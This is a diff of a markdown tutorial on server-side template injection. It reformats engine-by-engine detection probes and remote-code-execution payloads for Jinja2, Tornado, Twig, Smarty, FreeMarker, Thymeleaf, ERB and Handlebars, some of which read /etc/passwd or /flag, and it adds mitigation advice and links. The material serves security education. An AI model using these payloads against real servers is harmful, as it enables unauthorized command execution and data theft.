@@ -5,9 +5,8 @@
 - Template Engines
 - Template Engine Identification
 - Exploitation by Engine Type
-- Advanced Attack Vectors
 - Defense and Mitigation
-- Tools and Resources
+- Resources
 - Conclusion
 
 # Let's Start :
@@ -27,101 +26,114 @@ Once an injection point is confirmed, the second stage, ***Fingerprinting***, be
 ## Exploitation by Engine Type
 ### Python-based Templates
 - Jinja2
-        Syntax: {{ }} for expressions, {% %} for statements
-        Detection: {{ 7*7 }} → 49
-        Exploitation Chain:
-            ///Basic object traversal
-            {{ ''.__class__ }}
-            {{ ''.__class__.__mro__[1] }}
-            {{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+Syntax: {{ }} for expressions, {% %} for statements
+Detection: {{ 7*7 }} → 49
+Exploitation Chain:
+    ///Basic object traversal
+    {{ ''.__class__ }}
+    {{ ''.__class__.__mro__[1] }}
+    {{ ''.__class__.__mro__[1].__subclasses__() }}
 
-            ///Common RCE vectors
-            {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
-            {{ lipsum.__globals__['os'].popen('cat /flag').read() }}
-            { cycler.__init__.__globals__.os.popen('id').read() }}
-
+     ///Common RCE vectors
+    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+    {{ lipsum.__globals__['os'].popen('cat /flag').read() }}
+    { cycler.__init__.__globals__.os.popen('id').read() }}
+```
 - Tornado
-        Syntax: {{ }} and {% %}
-        Detection: {{ 7*7 }} → 49
-        Exploitation:
-            {% import os %}
-            {{ os.popen('id').read() }}
-            {{ __import__('os').popen('id').read() }}
-            
-    # PHP-based Templates
-    ## Twig
-        Syntax: {{ }} and {% %}
-        Detection: {{ 7*7 }} → 49
-        Exploitation:
-            {{ _self }}
-            {{ _self.env }}
-            {{ _self.env.getFilter('system')('id') }}
-            {{ ['id']|map('system')|join }}
-    ## Smarty
-        Syntax: { $variable }
-        Detection: { 7*7 } → 49
-        Exploitation:
-            {php}shell_exec('id'){/php}
-            {system('id')}
-            {self::getStreamVariable('file:///etc/passwd')}
-
-    # Java-based Templates
-    ## FreeMarker
-        Syntax: ${expression} and <#directive>
-        Detection: ${3*3} → 9
-        Exploitation:
-            ${"freemarker.template.utility.Execute"?new()("whoami")}
-            <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
-    ## Thymeleaf
-        Syntax: #{expression} and ${variable}
-        Detection: #{7*7} → 49
-        Exploitation:
-            ${T(java.lang.Runtime).getRuntime().exec('id')}
-            *{T(org.apache.tomcat.util.codec.binary.Base64).decode('eW91ci1jb21tYW5k')}
-
-    # Ruby-based Templates
-    ## ERB (Embedded Ruby)
-        Syntax: <%= %> and <% %>
-        Detection: <%= 7*7 %> → 49
-        Exploitation:
-            <%= Dir.entries('/') %>
-            <%= File.open('/etc/passwd').read %>
-            <%= system('cat /flag') %>
-
-    # JavaScript-based Templates
-    ## Handlebars
-        Syntax: {{ }}
-        Detection: Limited execution context
-        Exploitation:
-            {{#with "s" as |string|}}
-            {{#with "e"}}
-                {{#with split as |conslist|}}
+```
+Syntax: {{ }} and {% %}
+Detection: {{ 7*7 }} → 49
+Exploitation:
+    {% import os %}
+    {{ os.popen('id').read() }}
+    {{ __import__('os').popen('id').read() }}
+```     
+# PHP-based Templates
+- Twig
+```
+Syntax: {{ }} and {% %}
+Detection: {{ 7*7 }} → 49
+Exploitation:
+    {{ _self }}
+    {{ _self.env }}
+    {{ _self.env.getFilter('system')('id') }}
+    {{ ['id']|map('system')|join }}
+```
+- Smarty
+```
+Syntax: { $variable }
+Detection: { 7*7 } → 49
+Exploitation:
+    {php}shell_exec('id'){/php}
+    {system('id')}
+    {self::getStreamVariable('file:///etc/passwd')}
+```
+# Java-based Templates
+- FreeMarker
+```
+Syntax: ${expression} and <#directive>
+Detection: ${3*3} → 9
+Exploitation:
+    ${"freemarker.template.utility.Execute"?new()("whoami")}
+    <#assign ex="freemarker.template.utility.Execute"?new()> 
+    ${ ex("id") }
+```
+- Thymeleaf
+```
+Syntax: #{expression} and ${variable}
+Detection: #{7*7} → 49
+Exploitation:
+    ${T(java.lang.Runtime).getRuntime().exec('id')}
+    *{T(org.apache.tomcat.util.codec.binary.Base64).decode('eW91ci1jb21tYW5k')}
+```
+# Ruby-based Templates
+- ERB (Embedded Ruby)
+```
+Syntax: <%= %> and <% %>
+Detection: <%= 7*7 %> → 49
+Exploitation:
+    <%= Dir.entries('/') %>
+    <%= File.open('/etc/passwd').read %>
+    <%= system('cat /flag') %>
+```
+# JavaScript-based Templates
+- Handlebars
+```
+Syntax: {{ }}
+Detection: Limited execution context
+Exploitation:
+    {{#with "s" as |string|}}
+        {{#with "e"}}
+            {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
                 {{this.pop}}
-                {{this.push (lookup string.sub "constructor")}}
+                {{this.push "return require('child_process').execSync('id');"}}
                 {{this.pop}}
-                {{#with string.split as |codelist|}}
-                    {{this.pop}}
-                    {{this.push "return require('child_process').execSync('id');"}}
-                    {{this.pop}}
-                    {{#each conslist}}
-                    {{#with (string.sub.apply 0 codelist)}}
-                        {{this}}
-                    {{/with}}
-                    {{/each}}
+                {{#each conslist}}
+                {{#with (string.sub.apply 0 codelist)}}
+                    {{this}}
                 {{/with}}
-                {{/with}}
+                {{/each}}
             {{/with}}
             {{/with}}
-
-    The techniques discussed in this guide are foundational. The security community maintains large, constantly updating repositories of payloads and bypass techniques. For a comprehensive and up-to-date collection, I highly encourage you to consult the **PayloadsAllTheThings** project on GitHub : ```https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection```
-
-## Advanced Attack Vectors
-    
+        {{/with}}
+        {{/with}}
+```
+The techniques discussed in this guide are foundational. The security community maintains large, constantly updating repositories of payloads and bypass techniques. For a comprehensive and up-to-date collection, I highly encourage you to consult the **PayloadsAllTheThings** project on GitHub : ```https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection```
 
 ## Defense and Mitigation
+1. ***Avoidance***: Restrict user template modification where possible
+2. ***Logic-Less Engines***: Use Mustache, Handlebars, or similar to separate logic from presentation
+3. ***Sandbox Execution***: Run user templates in restricted environments with dangerous functions removed
+4. ***Container Isolation***: Deploy template processors in locked-down Docker containers to contain potential breaches
 
-
-## Tools and Resources
-
+## Resources
+- Intigriti artcile on SSTI : ```https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti#exploiting-advanced-ssti-vulnerabilities```
+- PortSwigger article on SSTI : ```https://portswigger.net/web-security/server-side-template-injection```
 
 ## Conclusion
+As we move through 2025, server-side template injection remains a persistently relevant attack vector, highlighting the continued challenges developers face with input validation. The detection and exploitation methods covered in this guide not only provide offensive security testing tools but also emphasize the defensive measures necessary to protect against SSTI in an increasingly template-driven development landscape.
